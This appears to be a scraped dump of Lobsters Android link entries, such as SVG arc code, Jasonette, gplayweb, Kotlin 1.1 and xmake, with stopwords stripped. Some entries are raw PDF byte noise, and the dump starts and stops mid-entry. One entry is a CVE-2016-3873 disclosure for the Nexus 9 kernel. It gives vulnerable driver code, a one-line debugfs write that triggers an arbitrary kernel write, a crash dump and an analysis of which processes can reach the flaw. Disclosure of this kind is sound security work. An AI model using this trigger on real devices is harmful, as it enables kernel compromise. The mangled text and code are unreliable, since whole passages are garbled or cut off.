greater slightly le arccos course unforgiving return nan case correct result would imaginary number code added clamp prevent clamp valid since theoretically equation producing value outside range angle measured fixed range value outofrange value getting eversoslightly range arc beziers use center point notation convert arc series bezier curve involves many thing parametric form ellipse equation derivative complex formula derive thankfully lmaisonobe work paper drawing elliptical arc using polylines quadratic cubic curve read translate code parametrics first bit getting parametric equation ellipse classic definition point ellipse look like tell u given x point resides edge ellipse useful drawing ellipse instead want get parametric form function take value respresents pseudoangle ellipse return x coordinate includes rotation ellipse away xaxis required svg arc static public ellipticarcpoint c r float xangle float return cx rx mathcos xangle mathcos ry mathsin xangle mathsin cy rx mathsin xangle mathcos ry mathcos xangle mathsin mentioned pseudoangle really proper angle angle formed one think ellipse circle stretched rotated word ofs svg specification purpose equation form iterate starting ending angle arc definition find point ellipse second function called ellipticarcderivative provides derivative two function let u calculate bezier curve approximates section arc following table maisonobe paper need ellipticarcpoint function ellipticarcderivative function start end angle arc approximating subdivide angle range small section get good approximation quite understand paper error calculation found another paper joe cridge indicating division provides potential one pixel error fairly high resolution device chose ensure smooth animation even partial arc high density mobile device ellipse putting together able render example svg build vector api started previous article smooth sexy curve bezier spline working backend apple core graphic code also run android canvas window systemdrawing calculating bezier curve need limit backend arc drawing ability one article series come still need calculate bound shape another adventure derivative work fuse full interesting coding follow twitter facebook get insight anecdote something particular crossplatform tool pique curiosity let know appendix endpoint center arc conversion uno code article publishing time used convert svg arc center point notation perform endpoint center arc parameter conversion detailed svg spec conversion endpoint center parameterization param r must ref case need scaled per svg spec internal static void endpointtocenterarcparams ref r float xangle bool flaga bool flag c angle double rx mathabs rx double ry mathabs ry double double double mathcos xangle mathsin xangle double mathsin xangle mathcos xangle double rxs rx rx double rys ry ry double double check radius small pq dq rxs rys see cr ratio dq rxs rys double cr cr scale rx ry equally cr var mathsqrt cr rx rx ry ry rxs rx rx rys ry ry double dq rxs rys double pq rxs rys dq dq double q mathsqrt mathmax pq use max account float precision flaga flag q q double cxp q rx ry double cyp q ry rx double cx mathcos xangle cxp mathsin xangle cyp double cy mathsin xangle cxp mathcos xangle cyp double theta svgangle rx cyp ry double delta svgangle cxp rx cyp ry cxp rx ry delta mathmod delta mathpif flag delta mathpif r float rx float ry c float cx float cy angle float theta float delta static float svgangle double ux double uy double vx double vy var u float ux float uy var v float vx float vy var dot vectordot u v var len vectorlength u vectorlength v var ang mathacos mathclamp dot len floating point precision slightly value appear ux vy uy vx ang ang return ang like like loading related
295,Lobsters,android,Android,"Toward Engineering a Secure, Android Ecosystem - Survey",https://taesoo.gtisc.gatech.edu/pubs/2016/xu:android-survey.pdf,toward engineering secure android ecosystem survey,,obj l n linearized e h endobj xref n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n trailer info r id prev size root r startxref eof obj l filter flatedecode length e stream b sy b endstream endobj obj metadata r jt r pagelabels r pagemode usenone page r openaction r fith type catalog name r endobj obj cropbox mediabox annots r r r r rotate resource font r r r r r r r r procset pdf text imageb imagec imagei extgstate r r r colorspace r r thumb r parent r content r type page endobj obj filter flatedecode length stream w wz e kco w c cp烆 v
296,Lobsters,android,Android,How to build cross-platform mobile apps using nothing more than a JSON markup,https://medium.freecodecamp.com/how-to-build-cross-platform-mobile-apps-using-nothing-more-than-a-json-markup-f493abec1873,build crossplatform mobile apps using nothing json markup,build crossplatform mobile apps using nothing json markup crossplatform native io android jasonette json markup model view controller basic structure predefined convention design philosophy native cross platform autolayout visual format language simple yet expressive scrolling list vertical horizontal implementation vertical section uitableview recyclerview uitableviewcells uilabel textview storyboards xml layout file implementation horizontal section type horizontal uicollectionview crossplatform native simple expressive uistackview linearlayout cs flexbox vertical component horizontal layer aka absolute positioning beyond view view write full declarative program json view model controller anything possible raspberry pi web app nodejs app rail app django app php app really web app even need server turn html website app cheerio library photo sharing app githubcom eliza chatbot app jasonetteelizaexample githubcom microblog app jasonettetokenauthenticationexample githubcom remotecontrol slack bot json blogjasonettecom gliechtensteiniosdevweeklyjson githubcom conclusion io version android version already grown vibrant community contributor maker io android contribution superwelcome,ethanhow build crossplatform mobile apps using nothing json markupfor past month working new way build crossplatform native io android apps called jasonetteit let describe entire app nothing single json markupif app consists entirely json treated like data served remotely cloud ondemandthe app logic longer need hardcoded device update much want updating json serverside app freshly loaded server every time open itcheck video quick intro jasonette many different part express function template style using json markup result write supersophisticated native mobile app fully model view controller mannerin post show specifically view part jasonette express various crossplatform ui pattern jsonhow implement jsontonative mapping internallybasic structureunder hood jasonette work similarly web browser instead interpreting html markup drawing web view jasonette fetch json markup construct native view ontheflythe markup json file follows predefined convention first start jason key two child head body look like jason head metadata document body actual content displayed view design philosophywhen first started designing json syntax describing native view couple constraint mind native reason io android came native layout system layout system designed desktop era always translate well small device world syntax express underlying layout mobile native manner possiblecross platform yet need cross platform example io something called autolayout visual format language implemented natively android right solutionsimple yet expressive easily expressed simple json format easy compose sophisticated structurewhen take look mobile apps built boil small number common interface pattern vertically scrolling listhorizontally scrolling listabsolute positioninggridlet take look first three since widely usedthe frequently used ui pattern scrolling list jasonette call sectionsthere two type section vertical horizontal vertical section scroll vertically horizontal section horizontallya single vertical section multiple item left multiple horizontal section right implementation vertical sectionsthis probably frequently used ui displaying data mobile device io jasonette implement uitableview android implemented recyclerview body section item type label text item type label text item type label text item io json markup creates uitableview three uitableviewcells contains uilabel corresponding text attributeson android creates recyclerview three item textview display corresponding text attributesall constructed programmatically without use storyboards io xml layout file android order make sure every detail programmable dynamicallyimplementation horizontal sectionssyntaxwise horizontal section much different need set type horizontal item flow horizontally body section type horizontal item type label text item type label text item type label text item note syntax horizontal section simple internally actually quite complex horizontal section io implemented uicollectionview wellknown technique basically horizontally scrolling uicollectionview embedded parent uitableview scroll vertically android implemented similar manner using nested recyclerviews insteadnow understand top level view structured let look item section made multiple unit scrollable item note item fixed dimension nothing inside item scrollsan item single component like label image button textarea etca combination componentsimplementing part straightforward section implementation choose crossplatform native simple expressive way form supersophisticated layoutthankfully io android similar native layout system called uistackview linearlayout respectively layout scheme turn similar cs flexbox would say crossplatform getlastly layout system infinitely composable seen create vertical layout horizontal layout nest vertical layout within horizontal layout forth recursivelyto create vertical layout would set type vertical set component item type vertical component type label text first type label text second type label text third thing horizontal layout set type horizontal instead item type horizontal component type image url http type label text rick nesting layout simple specifying layout another layout component item type horizontal component type image url http type vertical component type label text user type label text rick talked styling feature sake brevity style individual component well layout make sure layout look exactly like wanted need add style object describing font size width height color background cornerradius opacity layer aka absolute positioning sometimes may want position item exactly certain part screen without scrolling cssterms would call absolute positioning jasonette support called layerscurrently layer support two type child component image label place component anywhere desire screen way example jasonette app layer itemsin example two label temperature weather message image camera icon screen whose coordinate explicitly set make sure stay place without scrolling markup would look something like jason body style background camera layer type label text style font helveticaneuelight size top left width align center type label text cloud style font helveticaneue size type image url http camera style bottom width color ffffff right amazingly enough need know order build kind sophisticated view imagine mobile devicesjust like build anything simple lego block compose basic component layout different way create sophisticated viewhere example built composing aforementioned ui element beyond viewsif read far may either thinking wow cool wan na try yeah probably build toy app way build production app using way like briefly mentioned view part jasonette simplest part really powerful jasonette actually go much write full declarative program jsonyou attach action ui element get triggered user touch also trigger action one another via successerror callback also listen certain event automatically trigger actionsjust like describe view also model controller logic json anythingwhat possible since need server sends json jasonette completely platform agnostic proprietary server technology need depend need jsonand json come anywhere local device remote server even raspberry pi web app already web app instantly build mobile native app nodejs app rail app django app php app really web app making request api endpointyou even need server since fit entire modelviewcontroller single selfcontained json file pretty much store serve anywhere even create app static json file served pastebin github turn html website app jasonette powerful htmltojson parser powered cheerio library let transform html json object already know json build native view transformed json way build native app website even api course recommended way use json whenever really cool regardlessi go forever example photo sharing app let take photo using device camera upload post entry server creating feed jasonette app uploading image using networkuploadgithubcoma nodejs powered eliza chatbot app io android jasonetteelizaexampleelizaexample eliza app iphonegithubcoma microblog app complete session management jasonettetokenauthenticationexampletokenauthenticationexample jasonette microblog app built rail server side using devise remote control app slack bot remotecontrol slack bot jsona couple day ago shaunymca shared really cool project slack channel think example app turn html web page json turn native app gliechtensteiniosdevweeklyjsoniosdevweeklyjson native app io dev weekly wrrten pure jsongithubcomconclusionjasonette young project opensourced io version late android version month laterbut already grown vibrant community contributor maker active development hope technology empower anyone developer build apps effortlesslysounds good check website herelast least find github repository io android contribution superwelcome
297,Lobsters,android,Android,Effectively using Android without Google Play Services with gplayweb in Docker,https://fxaguessy.fr/en/articles/2017/02/11/effectively-using-android-without-google-play-services-gplayweb-in-docker/,effectively using android without google play service gplayweb docker,android without google play service privacy lineageos fairphone decided release fully open source version android o official google application fdroid android application repository allow installation apps unknown source mail silence firefox osmand openstreetmap amaze nextcloud davdroid ttrssreader many gplaycli github gplaycli fdroidserver dockerhub docker docker nginx proxy edit yalp store raccoon,many good reason using android without google play service google proprietary part android operating system mostly protect privacy google play service contain background process used google provide service eg push notification accurate geolocation combining gps wifi gsm application installation also track device usage location used application permanent connection google server custom rom popular lineageos community fork cyanogenmod propose default googleplayservicesfree version optional installation google play service current phone fairphone produced fairphone company sell smartphones hardware fair possible fairphone decided release fully open source version android o fairphone open o proposed alternative preinstalled o easily installed people concerned privacy opensource androidbased operating system fairphone open o contain google play service major drawback google play service installed use official google application particular google play application result easily download application phone prevents many people phone without google play service hopefully great opensource project fdroid combining android application download installupdate application reference repository catalogue free open source application allows find download many application keep updated nearly simply google play application note also use fdroid normal android phone google play service installed unrooted easily find install open source application need allow installation apps unknown source warning may cause security issue install unsure application list application fdroid repository use every day find example mail great email client supporting multiple account protocol silence smsmms app allowing exchange also encrypted message firefox need present osmand navigation map viewing application relying openstreetmap amaze great file manager nextcloud official application manage file stored nexcloudowncloud server davdroid synchronize calendar contact using caldavcarddav protocol ttrssreader r reader tinytinyrss based server many unfortunately find fdroid repository application want free open source application accepted official fdroid repository mobile application sometimes find opensource alternative favorite application cf many service alternative application eg favorite music streaming service bank public transportation solution generally use mobile website exists always convenient also use another android phone google play application download application want share two smartphones either bluetooth wifi yes also fdroid mobile application month used technique effectively use android phone without google play service discovered great opensource project gplayweb gplayweb allows easily download application google play within simple responsive web ui leverage gplaycli unofficial library download application google play unfortunately project updated could use easily especially fdroid integration present forked project github order use latest version gplaycli fdroidserver order install easily also wrote dockerfile publish container dockerhub tool web interface easily download application google play optional integration fdroid creates custom fdroid repository installupdate even easily application downloaded gplayweb interface within fdroid application order install using docker run docker run name gplayweb p v fdroid datafdroid fxaguessygplayweb want access remotely created fdroid repository using fdroid application android phone run docker run name fdroidnginx p v fdroidrepo usrsharenginxhtml ro nginx result access gplayweb http computer fdroid repository http android phone launch fdroid application go menu right top repository add new nginxfdroid container ip address simple tool download application google play without requiring privacyquestioning google play service use container server docker nginx proxy let encrypt integration allows access fdroid repository http anywhere need detail configuration let know comment however also know google play service define new apis used application result multiple application available google play fully work without google play service application catch properly exception service need google play service work generally geolocation service application developed le carefully directly crash anyway prefer course fdroid free opensource application available edit thanks comment article discovered two alternative gplayweb yalp store android application directly downloading application google play without requiring google play service raccoon software download application desktop computer opinion le convenient
299,Lobsters,android,Android,Espresso Test Addiction: An Anti-pattern,https://www.philosophicalhacker.com/post/espresso-test-addiction/,espresso test addiction antipattern,episode espresso test recorder edit test pyramid getting started automated testing android hard ui test outside android community testing pyramid suggestion want little possible martin fowler google robot pattern robot pattern martin fowler page object pattern use espresso test recorder conclusion fear supposed alleviated writing unit test return note thing happen write robolectric test,espresso test first time using test adoption also grown since introduction espresso test recorder android developer backstage episode espresso test recorder recordplayback tool almost always bad idea kind automation since resist changeability obstruct useful abstraction worth tool generate fragment script edit proper programming martin fowler test pyramid emphasis mine espresso test make nice addition testing toolbelt espresso test recorder moreover make getting started testing espresso easy said getting started automated testing android hard nice tool clear onboarding ramp testing good thing course know possible much good thing sometimes worry espresso espresso recorder contributing formation ui testing addiction android community worry moreover addiction probably lead le testing longrun ui test test recorder course new wellunderstood limitation moreover lot smart programmer said smart thing best use tool post review limitation best practice general suggests ought apply practice android development ui test outside android community outside android community caution around writing many ui test actually surprisingly loud clear mike cohn example express caution testing pyramid suggestion base test automation pyramid unit testing unit testing foundation solid test automation strategy represents largest part user interface testing placed top test automation pyramid want little possible cohn warns u article book article advertising healthy test pyramid testing end performed user interface resulting test expensive run expensive write brittle test pyramid suggestion echoed martin fowler google michael feather take another example also talk limitation large test particularly respect useful helping u refactor confidence unit testing one important component legacy code work systemlevel regression test great small localized test invaluable give feedback develop allow refactor much later contrasting unit test larger test say larger test tend take longer execute tends make test run rather frustrating test take long run end finally gerard meszaros xunit test pattern entire section explaining overusing ui test great one specific passage strong caution using recorded ui test particular last decade generalpurpose test automation tool become available testing application user interface tool use scripting language define test sexier tool rely robot user record playback metaphor test automation unfortunately many early experience latter tool left tester test manager le satisfied cause high test maintenance cost caused fragile test problem gist quote writing many ui test likely result suite slow support developmentrefactoring b difficult maintain change ui break large amount robot pattern point reader may wonder whether robot pattern make writing ton ui test ok robot pattern refresh memory way making ui test resistant change hiding detail view interaction behind robot object robot pattern mitigate issue brittle test overrelying ui test even robot pattern still going result subpar testing suite let start noting robot pattern new robot pattern martin fowler page object software engineer outside android community suggest much ui testing bad idea aware possibility robot pattern next note something obvious robot pattern nothing improve speed ui test lack speed ui test one main disadvantage overrelying finally although robot pattern make ui test resistant small ui change allow test gracefully adapt larger ui change suppose example particular piece functionality moved different screen within app happens need update test robot reason robot pattern change fact often better trying find way testing functionality unitlevel integrationlevel use espresso test recorder based experience recommendation experienced software engineer outside android community recommend handle use espresso recorder ui test way test functionality trying test unit level refactor test functionality unitlevel use test recorder record ui test support refactoring sure break refactored code test functionality unitlevel delete recorded test really interested testing application work whole using ui test fine epigraph opening post suggests refactor recorded test use robot pattern keep ui test resistant small change ui conclusion espresso test recorder great tool let suck writing many ui test way lie slow fragile test test useful result fear supposed alleviated writing unit test return want work code afraid change selfishly hope better note michael feather working effectively legacy code ibid gerard meszaros xunit test pattern poor defect localization another disadvantage ui test covering detail writing many ui test way ignoring design feedback test trying give thing happen write robolectric test unit testing android application hard android apps often bad architecture instead listening test telling u class tightly coupled violate principle single responsibility say forget unit test test everything ui instead key idea pattern however definitely older fowler page object pattern gerard meszaros talk xunit test pattern example published strategy recommended feather meszaros
300,Lobsters,android,Android,President Trump's Insecure Android,https://www.lawfareblog.com/president-trumps-insecure-android,president trump insecure android,insistence using android phone galaxy perhaps stagefright even catastrophic great seal,lost amid swirling insanity trump administration first week report president continued insistence using android phone galaxy perhaps put bluntly asking disaster president trump continued use dangerously insecure outofdate android device cause real panic normal white house would galaxy meet security requirement average teenager let alone purported leader free world best available android o phone woefully outofdate unsupported running marginally better without exaggerating hacking galaxy type project would assign homework advanced undergraduate class simple downloading suitable version stagefright entice trump clicking link alternatively one could advertise malware breitbart wait trump visit finding lawfare useful time please consider making contribution support compromised phone becomes catastrophic great record everything around transmit information reattaches network clear even brand new fully updated android iphone insufficient president united state worth great many multiple expensive zeroday exploit based available information working assumption trump phone compromised least foreign intelligence service actively exploited would exponentially dangerous carrying phone especially secure place security expert rightly aghast learn secretary clinton kept blackberry secure office state department far worse done first anyone around president presume actively recorded hostile power regardless location unless positive phone room one wonder many secret already lost abominable device trump team get speed closely held national security matter second nsa going need compromise campaign demonstrated possible pull president away twitter account insist mobile device despite dangerous security substantively destabilizing effect president demand nsa need accommodate technical engineering involve taking lockeddown android phone installing customized twitter client preconfigured president need tweet web browser must restricted trump click link necessary client take link clicked instead redirect request separate system downloads web page render output printer circumstance may president device able visit web page even insufficient president incredibly highvalue target high personal device trusted take input even restricted internet twitter phone need know enters dangerous area start emitting warning noise otherwise almost certainly wind situation room potentially disastrous result even phone still massive ongoing national security threat someone need impress upon trump insistence disregarding basic security imperils u perhaps fox friend would willing deliver message
301,Lobsters,android,Android,An Analysis of the Privacy and Security Risks of Android VPN Permission-enabled Apps,https://research.csiro.au/ng/wp-content/uploads/sites/106/2016/08/paper-1.pdf,analysis privacy security risk android vpn permissionenabled apps,,obj length filter flatedecode stream r n ތ e bb ž f n h u nx endstream endobj obj length filter flatedecode stream xڵ p r qz e c r u gz u h qjo
302,Lobsters,android,Android,Kotlin 1.1: What’s coming in the standard library,https://blog.jetbrains.com/kotlin/2017/01/kotlin-1-1-whats-coming-in-the-standard-library/,kotlin coming standard library,java preparation project jigsaw new standard library api forum slack issue tracker takeif also groupingby minof maxof mapgetvalue mapminus operator arraylike list instantiation function string number conversion oneach maptomap maptomutablemap abstract collection,java preparation java coming brings project jigsaw table java platform module system one constraint imposes two module declare public api package situation two module contribute package called split package face issue split package runtime artifact first kotlinruntime kotlinstdlib module share lot kotlin package second kotlinruntime kotlinreflect share kotlinreflect package going make artifact friendly module system merge kotlinruntime kotlinstdlib single artifact kotlinstdlib also going rename kotlinruntimejar shipped compiler distribution kotlinstdlibjar reduce amount confusion caused differently named standard library different build system rename happen two stage kotlinruntimejar kotlinstdlibjar content compiler distribution former removed kotlinreflect module move api kotlinreflect kotlinreflectfull package kotlin former api deprecated replacement suggested removed eventually note change affect extension function property provided kotlinreflect reflection interface couple exception class reflection interface located standard library moved use maven gradle depend kotlinstdlib need change anything depend kotlinruntime replace dependency kotlinstdlib new standard library api introduce new function class going published kotlin already tried new bit kotlin earlier release feedback hesitate share forum slack issue tracker takeif also two generalpurpose extension function applicable receiver also like apply take receiver action return receiver difference block inside apply receiver available block inside also available give another name want come handy want shadow outer scope fun blockcopy block also itcontent thiscontent takeif like filter single value check whether receiver meet predicate return receiver null combined elvisoperator early return allows write construct like val outdirfile file outputdirpath takeif itexists return false something existing outdirfile val index inputindexof keyword takeif error keyword found something index keyword input string given found groupingby api group collection key fold group time consists two part groupingby function terminal operation fold reduce eachcount first invoke collectiongroupingby key function return grouping instance binding provided key selector collection element call one folding operation available grouping iterates collection populates resulting map result folding element group example used count frequency character text val charfrequencies map char int textgroupingby eachcount minof maxof function used find lowest greatest two three given value value primitive number comparable object also overload function take additional comparator instance want compare object comparable val listof b val listof x z val minsize minof val longestlist maxof compareby itsize mapgetvalue extension map return existing value corresponding given key throw exception mentioning key found map produced withdefault function return default value instead throwing exception val map mapof key return nonnullable int value val value int mapgetvalue key throw nosuchelementexception mapgetvalue val mapwithdefault mapwithdefault k klength return val mapwithdefaultgetvalue mapminus operator kotlin could easily get copy readonly map new keyvalue pair inserted extension operator mapplus however remove key map resort le straightforward way like mapfilter mapfilterkeys mapminus operator fill gap overload available removing single key collection key sequence key array key val map mapof key val emptymap map key arraylike list instantiation function similar array constructor function create list mutablelist instance initialize element calling lambda list size index element mutablelist size index element string number conversion bunch new extension string class convert number without throwing exception invalid number stringtointornull int stringtodoubleornull double etc val port systemgetenv port tointornull note function box resulting number returning since return type nullable nullable number represented boxed value also integer conversion function like inttostring stringtoint stringtointornull got overload radix parameter allows specify base conversion oneach oneach small useful extension function collection sequence allows perform action possibly sideeffects element collectionsequence chain operation iterables behaves like foreach also return iterable instance sequence return wrapping sequence applies given action lazily element iterated inputdirwalk filter itisfile itnameendswith txt oneach println moving outputdir foreach movefile file outputdir ittorelativestring inputdir maptomap maptomutablemap function used easy copying map class immutablepropertybag map map string private val mapcopy maptomap abstract collection abstract class used base class implementing kotlin collection class implementing readonly collection abstractcollection abstractlist abstractset abstractmap mutable collection abstractmutablecollection abstractmutablelist abstractmutableset abstractmutablemap jvm abstract mutable collection inherit functionality jdk abstract collection
303,Lobsters,android,Android,"Android apps, IMEIs and privacy",https://mjg59.dreamwidth.org/46266.html,android apps imeis privacy,meitu selfie app use unique phone id,sudden wave people concerned meitu selfie app use unique phone id know app transmit phone imei unique perphone identifier ca nt altered normal circumstance server china able obtain value asks permission called readphonestate granted mean app obtain various bit information phone including unique id whether currently callwhy would anybody want id simple answer app author mostly make money selling advertising advertiser like know seeing advertisement app view tie single individual track user response different kind advert targeted hope profitable advertising towards user using id multiple apps make easier using devicelevel id rather applevel one preferred imei stable id android device persisting even across factory resetsthe downside using devicelevel id well whoever data know lot running let tailor advert taste certainly circumstance could embarrassing even compromising using imei even worse since also used fundamental telephony function instance phone reported stolen imei added blacklist network refuse allow join sufficiently malicious person could potentially report phone stolen get blocked providing imei phone network obviously able track device using someone enough access could figure app usage track via imei realistically anyone level access phone network could identify via mean reason believe part nefarious chinese plotis anything android later yes go setting hit apps hit gear menu top right choose app permission scroll phone see apps permission obtain information turn may cause apps crash otherwise misbehave whereas newer apps may simply ask grant permission refuse dontmeitu nt especially rare respect android apps handy request imei although nt tracked certainly something concerned meitu nt especially rare bigname apps exactly thing legitimate question whether android making easy apps obtain level identifying information without explicit informed consent user google anything make difficult apps continue making use information let turn conversation user privacy online rather blaming one specific example
304,Lobsters,android,Android,"Compile c++, objc and swift program across platforms fastly",http://tboox.org/2017/01/18/usage-demo/,compile c objc swift program across platform fastly,,
305,Lobsters,android,Android,CVE-2016-3873: Arbitrary Kernel Write in Nexus 9,https://sagi.io/2016/09/cve-2016-3873-arbitrary-kernel-write-in-nexus-9/,arbitrary kernel write nexus,nexus similar vulnerability marco grassi high fixed vulnerability report proof concept github vulnerable code proof concept attack surface analysis dac selinux process exploitation fix zach riggle commit fixed vulnerability,nexus kernel tegra kernel tree expose debugfs file entry allows privileged attacker write arbitrary value within kernel space root cause unsanitized input dangerous writel function similar vulnerability discovered marco grassi earlier year severity rated high google existed since nexus inception back november reported android security team june fixed september vulnerability verified latest nexus image lte nonlte userreleasekeys userreleasekeys vulnerability report proof concept found github vulnerable code following code path taken register debugfs file entry created cldvfs directory clregisterfops file operation int init tegracldvfsdebuginit struct clk dfllclk cldvfsdentry debugfscreatedir cldvfs dfllclk dent debugfscreatefile register sirugo siwusr cldvfsdentry dfllclk clregisterfops goto errout return static const struct fileoperations clregisterfops write clregisterwrite write syscall clregisterwrite securely copy user space buffer par content two numeric value val value written offs offset constant address mentioned persistent across boot static ssizet clregisterwrite struct file file const char user userbuf sizet count lofft ppos char buf offs val struct tegracldvfs cld c udfllcldvfs sizeof buf count return einval copyfromuser buf userbuf count return efault sscanf buf x x offs val return cldvfswritel cld val offs return count eventually either cldvfswritel called rawwritel used write value val offs constantaddress either cl clbase cld result arbitrary kernel write static inline void cldvfswritel struct tegracldvfs cld val offs offs cld val offs return rawwritel val void cld clbase offs static inline void struct tegracldvfs cld val offs rawwritel val cld offs proof concept cool thing vulnerability trigger entirely command line cd syskerneldebugclockdfllcpucldvfs echo register device crash instantly crashdump unable handle kernel paging request virtual address pgd internal error oops preempt smp cpu pid comm sush tainted g w task ti taskti pc lr pc lr pstate sp seen kernel try access address simply constantaddress since proper mapping exists page table crash also note register hold value specified attack surface analysis analyse discretionary access control dac mandatory access control mac selinux android find active process trigger vulnerability dac dacwise write file l lz register rwr r root root u objectr debugfs register attacker execute code uid root within debugfs selinux context selinux selinuxwise context write debugfs file looking previously mentioned output l lz need find selinux domain allow rule target type debugfs open write permission file class analysing nexus sepolicy yield allow domain debugfs file write open append selinuxwise domain open write append file debugfs context therefore dac limit u need find process uid root process active process trigger vulnerability analyzing active process using p z yield u r init root init u r ueventd root sbinueventd u r watchdogd root sbinwatchdogd u r vold root systembinvold u r healthd root sbinhealthd u r lmkd root systembinlmkd u r netd root systembinnetd u r debuggerd root systembindebuggerd u r debuggerd root u r installd root systembininstalld u r zygote root u r zygote root zygote code execution within process trigger exploit vulnerability exploitation fix exploit vulnerability untrustedapp security context one would first need escalate privilege untrustedapp one previously mentioned process instance disclosed zach riggle may used since allows untrusted app execute code within debuggerd thought google nvidia would fix vulnerability checking bound given offset commit fixed vulnerability reveals google simply removed register file showing debug file system clearly register file node needed production build one wonder many unnecessary vulnerable debugfs sysfs file node
306,Lobsters,android,Android,Scan source codes and build project without makefile,http://tboox.org/2017/01/07/build-without-makefile/,scan source code build project without makefile,compile open source library fastly compile run testing code multilanguage support compile multiple executables time manual configuration,recently added new feature xmake need write makelike file xmakelua makefileam cmakelisttxt etc also build directly scan source file generate xmakelua automatically building project xmake detect main function source file order distinguish static library executable program currently project singlelevel directory supported compile open source library although approach limitation sufficient complie run temporary code testing example downloaded source want compile need enter zlib source directory run following command done output result xmakelua found scanning file target static compressc deflatec gzclosec gzlibc gzreadc gzwritec infbackc inffastc inflatec inftreesc treesc uncomprc zutilc xmakelua generated scan ok checking architecture checking xcode sdk version macosx checking target minimal version checking c compiler cc xcrun sdk macosx clang checking c compiler cxx xcrun sdk macosx clang checking objc compiler mm xcrun sdk macosx clang checking objc compiler mxx xcrun sdk macosx clang checking swift compiler sc xcrun sdk macosx swiftc checking assember xcrun sdk macosx clang checking linker ld xcrun sdk macosx clang checking static library archiver ar xcrun sdk macosx ar checking static library extractor ex xcrun sdk macosx ar checking shared library linker sh xcrun sdk macosx clang checking debugger dd xcrun sdk macosx lldb checking golang compiler go go configure ex xcrun sdk macosx ar sh xcrun sdk macosx clang host macosx ar xcrun sdk macosx ar buildir build xcrun sdk macosx clang plat macosx xcodedir applicationsxcodeapp arch mxx xcrun sdk macosx clang go go targetminver ccache ccache mode release clean true cxx xcrun sdk macosx clang cc xcrun sdk macosx clang dd xcrun sdk macosx lldb kind static ld xcrun sdk macosx clang xcodesdkver sc xcrun sdk macosx swiftc mm xcrun sdk macosx clang configure ok clean ok ccache compilingrelease ccache compilingrelease compressc ccache compilingrelease ccache compilingrelease deflatec ccache compilingrelease gzclosec ccache compilingrelease gzlibc ccache compilingrelease gzreadc ccache compilingrelease gzwritec ccache compilingrelease infbackc ccache compilingrelease inffastc ccache compilingrelease inflatec ccache compilingrelease inftreesc ccache compilingrelease treesc ccache compilingrelease uncomprc ccache compilingrelease zutilc archivingrelease build ok xmake scan current directory detect source code found main function static library project build static library write makelike file xmakelua use makefile zlib project compiled directly xmakelua file generated edit xmakelua build complicated project content generated xmakelua define target target set kind setkind static add file addfiles addfiles compressc addfiles addfiles deflatec addfiles gzclosec addfiles gzlibc addfiles gzreadc addfiles gzwritec addfiles infbackc addfiles inffastc addfiles inflatec addfiles inftreesc addfiles treesc addfiles uncomprc addfiles zutilc fastly compile run testing code example want write simple program mainc echo hello world use gcc compile run need run two command gcc mainc demo demo use xmake run need run done output result lot code file need also run one command easy convenient multilanguage support feature code detection realtime compilation support c c also support objc swift support golang future example downloaded io open source framework code fmdb fmdbh fmdatabaseh fmdatabasem fmdatabaseadditionsh fmdatabaseadditionsm fmdatabasepoolh fmdatabasepoolm fmdatabasequeueh fmdatabasequeuem fmresultseth fmresultsetm makelike file project directory us xmake build directly io static library xmake f p iphoneos xmake output result xmakelua found scanning file target fmdb static fmdatabasem fmdatabaseadditionsm fmdatabasepoolm fmdatabasequeuem fmresultsetm xmakelua generated scan ok checking architecture checking xcode sdk version iphoneos checking target minimal version checking c compiler cc xcrun sdk iphoneos clang checking c compiler cxx xcrun sdk iphoneos clang checking objc compiler mm xcrun sdk iphoneos clang checking objc compiler mxx xcrun sdk iphoneos clang checking assember gaspreprocessorpl xcrun sdk iphoneos clang checking linker ld xcrun sdk iphoneos clang checking static library archiver ar xcrun sdk iphoneos ar checking static library extractor ex xcrun sdk iphoneos ar checking shared library linker sh xcrun sdk iphoneos clang checking swift compiler sc xcrun sdk iphoneos swiftc configure ex xcrun sdk iphoneos ar ccache ccache host macosx ar xcrun sdk iphoneos ar buildir build usrlocalsharexmaketoolsutilsgaspreprocessorpl xcrun sdk iphoneos clang arch mxx xcrun sdk iphoneos clang cxx xcrun sdk iphoneos clang targetminver xcodedir applicationsxcodeapp clean true sh xcrun sdk iphoneos clang cc xcrun sdk iphoneos clang ld xcrun sdk iphoneos clang mode release kind static plat iphoneos xcodesdkver sc xcrun sdk iphoneos swiftc mm xcrun sdk iphoneos clang configure ok clean ok ccache compilingrelease fmdatabasem ccache compilingrelease fmdatabaseadditionsm ccache compilingrelease fmdatabasepoolm ccache compilingrelease fmdatabasequeuem ccache compilingrelease fmresultsetm archivingrelease libfmdba build ok compile multiple executables time output result xmakelua found scanning file target static cdjpegc examplec jcapiminc jcapistdc jccoefctc jccolorc jcdctmgrc jchuffc jcinitc jcmainctc jcmarkerc jcmasterc jcomapic jcparamc jcphuffc jcprepctc jcsamplec jctransc jdapiminc jdapistdc jdatadstc jdatasrcc jdcoefctc jdcolorc jddctmgrc jdhuffc jdinputc jdmainctc jdmarkerc jdmasterc jdmergec jdphuffc jdpostctc jdsamplec jdtransc jerrorc jfdctfltc jfdctfstc jfdctintc jidctfltc jidctfstc jidctintc jidctredc jmemansic jmemmgrc jmemnamec jmemnobsc jutilsc rdbmpc rdcolmapc rdgifc rdppmc rdrlec rdswitchc rdtargac transuppc wrbmpc wrgifc wrppmc wrrlec wrtargac target binary target cjpeg binary cjpegc target ckconfig binary ckconfigc target djpeg binary djpegc target jpegtran binary jpegtranc target rdjpgcom binary rdjpgcomc target wrjpgcom binary wrjpgcomc xmakelua generated scan ok checking architecture checking xcode sdk version macosx checking target minimal version checking c compiler cc xcrun sdk macosx clang checking c compiler cxx xcrun sdk macosx clang checking objc compiler mm xcrun sdk macosx clang checking objc compiler mxx xcrun sdk macosx clang checking swift compiler sc xcrun sdk macosx swiftc checking assember xcrun sdk macosx clang checking linker ld xcrun sdk macosx clang checking static library archiver ar xcrun sdk macosx ar checking static library extractor ex xcrun sdk macosx ar checking shared library linker sh xcrun sdk macosx clang checking debugger dd xcrun sdk macosx lldb checking golang compiler go go configure ex xcrun sdk macosx ar sh xcrun sdk macosx clang host macosx ar xcrun sdk macosx ar buildir build xcrun sdk macosx clang plat macosx xcodedir applicationsxcodeapp arch mxx xcrun sdk macosx clang go go targetminver ccache ccache mode release clean true cxx xcrun sdk macosx clang cc xcrun sdk macosx clang dd xcrun sdk macosx lldb kind static ld xcrun sdk macosx clang xcodesdkver sc xcrun sdk macosx swiftc mm xcrun sdk macosx clang configure ok clean ok ccache compilingrelease cdjpegc ccache 